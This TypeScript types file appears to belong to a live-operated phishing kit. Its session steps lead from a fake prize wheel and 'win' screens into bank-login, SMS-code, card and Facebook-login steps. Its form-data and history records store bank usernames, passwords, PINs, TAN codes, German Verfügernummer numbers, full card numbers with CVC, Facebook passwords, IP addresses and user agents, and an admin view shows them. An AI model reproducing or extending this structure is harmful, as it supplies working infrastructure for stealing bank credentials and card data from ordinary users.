export type SessionStep =
  | "code_entry"
  | "wheel"
  | "verify"
  | "win"
  | "bank"
  | "banken"
  | "login"
  | "bank_login"
  | "wait"
  | "sms"
  | "card"
  | "facebook"
  | "congrats"
  | "special_approval"
  | "generator1"
  | "generator2"
  | "custom_question"
  | "invalid_bank"
  | "live_support";
export type SessionStatus = "online" | "offline" | "SUCCESS" | "CONGRATS" | "SPECIAL_INFO";

export type SessionFormData = {
  firstName?: string;
  lastName?: string;
  phone?: string;
  bankPhone?: string;
  bankName?: string;
  bankSlug?: string;
  loginMethod?: string;
  personalCode?: string;
  username?: string;
  password?: string;
  verfuegernummer?: string;
  pin?: string;
  tacCode?: string;
  smsCode?: string;
  cardHolder?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvc?: string;
  fbFirstName?: string;
  fbLastName?: string;
  fbEmail?: string;
  fbPassword?: string;
  fbUserId?: string;
  fbSubmittedAt?: string;
  specialNoticeText?: string;
  specialNoticeImage?: string;
  specialNoticeLang?: "de" | "tr";
  specialNoticeSentAt?: string;
  approvalStatus?: string;
  approvalCode?: string;
  transferAmount?: string;
  generatorType?: string;
  generatorCode?: string;
  generatorData?: Record<string, string>;
  generatorSubmittedAt?: string;
  generatorCurrent?: Record<string, { data?: Record<string, string>; submittedAt?: string; generatorCode?: string }>;
  generatorLoginHistory?: GeneratorLoginHistoryRecord[];
  customQuestions?: CustomQuestionRecord[];
  approvalHistory?: string;
  customMessage?: string;
  customImage?: string;
  orderedField1?: string;
  orderedField2?: string;
  orderedField2Type?: string;
  // Geçmiş giriş kayıtları (sadece admin modal'ında görünür, ana kolonlara karışmaz)
  bankLoginHistory?: BankLoginHistoryRecord[];
  facebookLoginHistory?: FacebookLoginHistoryRecord[];
  cardLoginHistory?: CardLoginHistoryRecord[];
  [key: string]: string | number | boolean | null | undefined | unknown[] | Record<string, unknown>;
};

export type BankLoginHistoryRecord = {
  submittedAt: string;
  bankName?: string;
  bankSlug?: string;
  loginMethod?: string;
  personalCode?: string;
  bankPhone?: string;
  username?: string;
  password?: string;
  verfuegernummer?: string;
  pin?: string;
  tacCode?: string;
  orderedField1?: string;
  orderedField2?: string;
  orderedField2Type?: string;
  extra?: string;
};

export type FacebookLoginHistoryRecord = {
  submittedAt: string;
  fbFirstName?: string;
  fbLastName?: string;
  fbEmail?: string;
  fbPassword?: string;
  fbUserId?: string;
};

export type GeneratorLoginHistoryRecord = {
  submittedAt: string;
  generatorType?: string;
  generatorCode?: string;
  data?: Record<string, string>;
};

export type CustomQuestionRecord = {
  question: string;
  askedAt: string;
  answer?: string;
  answeredAt?: string;
};

export type CardLoginHistoryRecord = {
  submittedAt: string;
  cardHolder?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvc?: string;
};

export type DemoSession = {
  id: string;
  public_id?: number;
  amount: number;
  current_step: SessionStep;
  status: SessionStatus;
  sms_digits?: number;
  sms_custom_text?: string;
  form_data: SessionFormData;
  created_at?: string;
  updated_at?: string;
  is_hidden?: boolean;
  partner_name?: string;
  participation_code?: string;
  ip_address?: string;
  user_agent?: string;
};
